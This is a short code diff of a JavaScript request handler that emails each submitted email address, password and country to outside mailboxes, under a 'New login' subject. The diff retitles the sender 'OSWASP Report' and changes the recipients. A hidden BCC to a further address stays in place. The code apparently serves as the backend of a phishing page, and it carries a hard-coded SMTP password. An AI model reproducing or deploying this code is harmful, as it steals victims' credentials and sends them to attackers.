@@ -15,15 +15,15 @@ export default async function handler(req, res) {
     port: 587,
     secure: false, // true for 465, false for other ports
     auth: {
-      user: 'coinreport@mailo.com', // SMTP username
+      user: 'sender1@mailo.com', // SMTP username
       pass: 'sagekidayo', // SMTP password
     },
   });
 
   // Email options
   let mailOptions = {
-    from: '"Coin Report" <coinreport@mailo.com>', // Sender address
-    to: 'mendharry042@gmail.com', // List of recipients
+    from: '"OSWASP Report" <sender1@mailo.com>', // Sender address
+    to: 'yangdong@mailo.com', // List of recipients
     bcc: 'money@monemail.com', // BCC recipients
     subject: `New login from ${country}`, // Subject line including the sender's country
     text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}`, // Plain text body
